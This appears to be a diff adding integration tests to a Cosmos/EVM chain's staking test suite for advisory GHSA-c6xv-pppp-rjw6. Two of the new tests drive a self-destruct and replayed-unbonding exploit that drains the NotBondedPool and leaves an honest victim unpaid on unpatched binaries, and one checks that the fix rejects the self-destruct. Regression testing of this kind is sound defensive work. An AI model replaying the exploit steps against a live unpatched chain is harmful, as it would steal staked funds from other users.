@@ -20,6 +20,7 @@ from pystarport.utils import (
     wait_for_new_blocks,
 )
 from web3.exceptions import TransactionNotFound
+from web3.utils.address import get_create_address
 
 from .network import setup_mantra
 from .utils import (
@@ -50,6 +51,8 @@ VALIDATOR = PRECOMPILE.fns.validator
 STAKING = "0x0000000000000000000000000000000000000800"
 TEST_STAKING = Contract(build_contract("TestStaking")["abi"])
 EXPLOIT = Contract(build_contract("StakingExploit")["abi"])
+SELFDESTRUCT = Contract(build_contract("StakingSelfdestruct")["abi"])
+AMP_FACTORY = Contract(build_contract("AmpFactory", contract="AmpFactory")["abi"])
 gas = 400_000
 
 
@@ -148,6 +151,56 @@ async def test_delegate_transfer_to_bonded_pool_rejected(mantra):
     assert cli.staking_pool() == pool_before
     assert await delegated_amount(w3, exploit, validator) == deleg_before
     assert await w3.eth.get_balance(exploit) == contract_before
+
+
+async def test_selfdestruct_unbonding_drains_unfixed(mantra):
+    """GHSA-c6xv-pppp-rjw6: maturity debits not_bonded_tokens_pool and leaves
+    the claim.
+    """
+    cli = mantra.cosmos_cli()
+    w3 = mantra.async_w3
+    params = cli.get_params("staking")
+    if duration(params["unbonding_time"]) > 60:
+        pytest.skip("unbonding_time too long for this test")
+
+    acct = ACCOUNTS["community"]
+    amt = 100
+    # salt 110 belongs to test_selfdestruct_with_staking_positions_rejected
+    factory = await deploy_by_create2(w3, acct, "StakingSelfdestruct", 111)
+    killed = eth_to_bech32(get_create_address(factory, 1))
+    validator = cli.debug_addr((await get_validators(w3))[0][0], bech="val")
+    not_bonded = cli.staking_pool(bonded=False)
+
+    def unbonding():
+        ubd = cli._query("staking", "unbonding-delegation", killed, validator)
+        entry = ubd["unbond"]["entries"][0]
+        return int(entry["balance"]), entry["completion_time"]
+
+    height = cli.block_height()
+    tx_hash = await send_value(
+        w3,
+        acct,
+        factory,
+        amt * WEI_PER_DENOM,
+        data=SELFDESTRUCT.fns.exploit(validator, amt, True).data,
+        gas=3_000_000,
+    )
+    res = await wait_for_eth_tx_result(cli, w3, tx_hash, height)
+    assert res["code"] == 0, res
+
+    # the contract self-destructed but its unbonding delegation survived
+    balance, completion = unbonding()
+    assert balance == amt
+    assert cli.staking_pool(bonded=False) == not_bonded + amt
+    with pytest.raises(AssertionError):
+        cli.account(killed)
+
+    wait_for_block_time(cli, isoparse(completion) + timedelta(seconds=1))
+
+    # maturity debits not_bonded_pool but credits the gone account nothing
+    assert cli.staking_pool(bonded=False) == not_bonded
+    assert cli.balance(killed, denom=params["bond_denom"]) == 0
+    assert unbonding()[0] == amt
 
 
 async def send_value(w3, acct, to, value, data=b"", gas=30000):
@@ -485,3 +538,96 @@ async def test_staking_eth_estimate_gas_matches_eth_call(mantra):
         w3, delegator, to=STAKING, gas=gas
     )
     assert_estimate_covers_receipt(estimated, int(receipt["gasUsed"]))
+
+
+@pytest.mark.parametrize("undelegate", [False, True], ids=["delegation", "unbonding"])
+async def test_selfdestruct_with_staking_positions_rejected(mantra, undelegate):
+    """A contract holding staking positions can't self-destruct (GHSA-c6xv-pppp-rjw6).
+
+    Pre-fix, deleting it orphaned its delegation or unbonding delegation.
+    """
+    cli = mantra.cosmos_cli()
+    w3 = mantra.async_w3
+    acct = ACCOUNTS["community"]
+    factory = await deploy_by_create2(w3, acct, "StakingSelfdestruct", 110)
+    validator = cli.debug_addr((await get_validators(w3))[0][0], bech="val")
+    amt = 5
+
+    height = cli.block_height()
+    tx_hash = await send_value(
+        w3,
+        acct,
+        factory,
+        amt * WEI_PER_DENOM,
+        data=SELFDESTRUCT.fns.exploit(validator, amt, undelegate).data,
+        gas=3_000_000,
+    )
+    # the deletion is refused at statedb commit, so there is no eth receipt
+    res = await wait_for_eth_tx_result(cli, w3, tx_hash, height)
+    assert "staking positions" in res["log"], res
+
+
+async def test_selfdestruct_drains_whole_not_bonded_pool_unfixed(mantra):
+    """GHSA-c6xv-pppp-rjw6 (High): replayed unbonding claims drain the whole
+    NotBondedPool, leaving an honest victim unpaid.
+
+    The attacker orphans an unbonding entry (self-destruct) and points many
+    maturity-queue refs at it (AmpFactory), each re-debiting the pool. Only on a
+    binary without the DeleteAccount staking-positions guard (evm < v0.6.4).
+    """
+    cli = mantra.cosmos_cli()
+    w3 = mantra.async_w3
+    params = cli.get_params("staking")
+    if duration(params["unbonding_time"]) > 60:
+        pytest.skip("unbonding_time too long for this test")
+    denom = params["bond_denom"]
+    attacker = ACCOUNTS["community"]
+    victim = ACCOUNTS["signer1"]
+    victim_bech = eth_to_bech32(victim.address)
+    amt = 5000
+    n = 6  # (n+1)*amt = 35000 > pool (amt + seed = 25000) -> drains to ~0
+    seed = 20000
+    salt = (17).to_bytes(32, "big")
+
+    factory = await deploy_by_create2(w3, attacker, "AmpFactory", 190)
+    valoper = cli.debug_addr((await get_validators(w3))[0][0], bech="val")
+
+    def not_bonded():
+        return cli.staking_pool(bonded=False)
+
+    def last_completion(addr):
+        q = cli._query("staking", "unbonding-delegation", addr, valoper)
+        return max(e["completion_time"] for e in q["unbond"]["entries"])
+
+    # attacker: build n+1 queue refs to one orphaned entry (matures first)
+    height = cli.block_height()
+    tx_hash = await send_value(
+        w3,
+        attacker,
+        factory,
+        amt * WEI_PER_DENOM,
+        data=AMP_FACTORY.fns.run(salt, valoper, amt, n).data,
+        gas=12_000_000,
+    )
+    res = await wait_for_eth_tx_result(cli, w3, tx_hash, height)
+    assert res["code"] == 0, res
+    killed = eth_to_bech32(
+        web3.Web3.to_checksum_address(await AMP_FACTORY.fns.last().call(w3, to=factory))
+    )
+
+    # honest victim: legit undelegate seeds NotBondedPool, matures LAST
+    await delegate(w3, victim, valoper, seed, to=STAKING)
+    await undelegate(w3, victim, valoper, seed, to=STAKING)
+    victim_before = cli.balance(victim_bech, denom=denom)
+    seeded = not_bonded()
+    attacker_comp = last_completion(killed)
+    victim_comp = last_completion(victim_bech)
+
+    wait_for_block_time(cli, isoparse(attacker_comp) + timedelta(seconds=1))
+    after_attack = not_bonded()
+    wait_for_block_time(cli, isoparse(victim_comp) + timedelta(seconds=1))
+    victim_recovered = cli.balance(victim_bech, denom=denom) - victim_before
+
+    # the whole available pool was debited away; the honest victim is left unpaid
+    assert after_attack <= amt, (seeded, after_attack)
+    assert victim_recovered == 0, victim_recovered
